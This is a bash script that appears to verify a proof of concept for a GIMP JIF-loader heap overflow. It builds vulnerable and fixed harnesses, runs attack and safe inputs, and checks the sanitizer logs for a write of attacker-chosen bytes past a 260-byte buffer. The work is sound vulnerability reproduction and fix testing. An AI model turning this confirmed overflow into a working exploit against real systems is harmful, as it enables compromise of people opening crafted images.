#!/usr/bin/env bash
# One-command local verification for CVE-2026-136329 (GIMP ReadJeffsImage).
set -u
cd "$(dirname "$0")"
mkdir -p out

pass=0
fail=0
ok()   { echo "PASS $1"; pass=$((pass+1)); }
bad()  { echo "FAIL $1"; fail=$((fail+1)); }
has()  { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }

ASAN_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O0 -g -I. -DSTANDIN_INFLATE"
PLAIN_FLAGS="-O0 -g -I. -DPLAIN_MODE"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0

echo "== build =="
gcc   $ASAN_FLAGS -o out/asan-vuln harness/driver.c -lz && ok "gcc ASan vulnerable build" || bad "gcc ASan vulnerable build"
clang $ASAN_FLAGS -o out/clang-asan-vuln harness/driver.c -lz && ok "clang ASan vulnerable build" || bad "clang ASan vulnerable build"
gcc   $ASAN_FLAGS -DVARIANT_FIXED -o out/asan-fixed harness/driver.c -lz && ok "gcc ASan fixed build" || bad "gcc ASan fixed build"
gcc   -fsanitize=address -fno-omit-frame-pointer -O0 -g -I. -o out/asan-realz harness/driver.c -lz && ok "gcc ASan real-libz control build" || bad "gcc ASan real-libz control build"
gcc   $PLAIN_FLAGS -o out/plain-vuln harness/driver.c -lz && ok "plain vulnerable build" || bad "plain vulnerable build"
gcc   $PLAIN_FLAGS -DVARIANT_FIXED -o out/plain-fixed harness/driver.c -lz && ok "plain fixed build" || bad "plain fixed build"

echo "== runs =="
out/asan-vuln       attack > out/gcc-attack.log 2>&1 || true
out/clang-asan-vuln attack > out/clang-attack.log 2>&1 || true
out/asan-fixed      attack > out/fixed-attack.log 2>&1 || true
out/asan-realz      attack > out/realz-attack.log 2>&1 || true
out/asan-vuln       safe   > out/vuln-safe.log 2>&1 || true
out/asan-fixed      safe   > out/fixed-safe.log 2>&1 || true
out/plain-vuln      attack > out/plain-attack.log 2>&1 || true
out/plain-vuln      safe   > out/plain-safe.log 2>&1 || true
out/plain-fixed     attack > out/plain-fixed-attack.log 2>&1 || true

echo "== gcc ASan attack (324 chosen bytes past a 260-byte JIF index buffer) =="
has out/gcc-attack.log "AddressSanitizer: heap-buffer-overflow" && ok "gcc ASan heap-buffer-overflow" || bad "gcc ASan heap-buffer-overflow"
has out/gcc-attack.log "WRITE of size 1" && ok "gcc ASan WRITE of chosen byte" || bad "gcc ASan WRITE of chosen byte"
has out/gcc-attack.log "0 bytes after 260-byte region" && ok "write exactly past 260-byte indexes buffer" || bad "write exactly past 260-byte indexes buffer"
has out/gcc-attack.log "ReadJeffsImage pins/jif-vulnerable.inc:106" && ok "ASan write frame pins vulnerable inflate call" || bad "ASan write frame pins vulnerable inflate call"
has out/gcc-attack.log "g_try_malloc harness/driver.c:43" && ok "ASan allocation frame pinned" || bad "ASan allocation frame pinned"

echo "== clang ASan attack =="
has out/clang-attack.log "ReadJeffsImage .*pins/jif-vulnerable.inc:106" && ok "clang ASan write frame pins vulnerable excerpt" || bad "clang ASan write frame pins vulnerable excerpt"
has out/clang-attack.log "0 bytes after 260-byte region" && ok "clang ASan write past 260-byte buffer" || bad "clang ASan write past 260-byte buffer"

echo "== fixed and safe-input controls =="
hasnt out/fixed-attack.log "AddressSanitizer" && ok "fixed build ASan-clean on attack" || bad "fixed build ASan-clean on attack"
has out/fixed-attack.log "MODE=attack RC=0 ERR=image data" && ok "fixed build rejects wrapped JIF size" || bad "fixed build rejects wrapped JIF size"
hasnt out/fixed-safe.log "AddressSanitizer" && ok "fixed build ASan-clean on safe input" || bad "fixed build ASan-clean on safe input"
has out/fixed-safe.log "MODE=safe RC=1 ERR=" && ok "fixed build accepts safe JIF" || bad "fixed build accepts safe JIF"
hasnt out/vuln-safe.log "AddressSanitizer" && ok "vulnerable build ASan-clean on safe input" || bad "vulnerable build ASan-clean on safe input"
has out/vuln-safe.log "MODE=safe RC=1 ERR=" && ok "vulnerable build accepts safe JIF" || bad "vulnerable build accepts safe JIF"

echo "== plain chosen-byte readback (real libz payload) =="
has out/plain-attack.log "CANARY_AT=260 FIRST=4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d" && ok "16 chosen 0x4d bytes past 260-byte buffer" || bad "16 chosen 0x4d bytes past 260-byte buffer"
hasnt out/plain-safe.log "FIRST=4d4d" && ok "safe input writes no chosen marker" || bad "safe input writes no chosen marker"
has out/plain-fixed-attack.log "MODE=attack RC=0 ERR=image data" && ok "plain fixed build rejects wrapped size" || bad "plain fixed build rejects wrapped size"
hasnt out/plain-fixed-attack.log "FIRST=4d4d" && ok "plain fixed build writes no chosen marker" || bad "plain fixed build writes no chosen marker"

echo "== preserved negative: uninstrumented libz writes are invisible to ASan =="
hasnt out/realz-attack.log "AddressSanitizer" && ok "real-libz ASan build reports no fault" || bad "real-libz ASan build reports no fault"
has out/realz-attack.log "MODE=attack RC=1 ERR=" && ok "real-libz build completes decompress" || bad "real-libz build completes decompress"

echo "== pins =="
for pair in "pins/jif-vulnerable.inc 36288ad05b7a57b9f12c95e0d8f780ef84838581c4f6ebd3b01b0fe42c4fc032" \
            "pins/jif-fixed.inc 98d710f4bf9002adaa3941159f8d9705e6a6ed6b92be190f7509a801393d2f50" \
            "src/file-gif-load-vulnerable.c 7811585724082652312f95018cd0629bddce0557326173b9242d2457ce66273d" \
            "src/file-gif-load-fixed.c 703c1e124d3bf8e1dc5f92a0cf615f29f54d1fed401984881eb6d0b9c9a478c6"; do
    set -- $pair
    got=$(sha256sum "$1" | cut -d' ' -f1)
    [ "$got" = "$2" ] && ok "pin hash $1" || bad "pin hash $1"
done

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
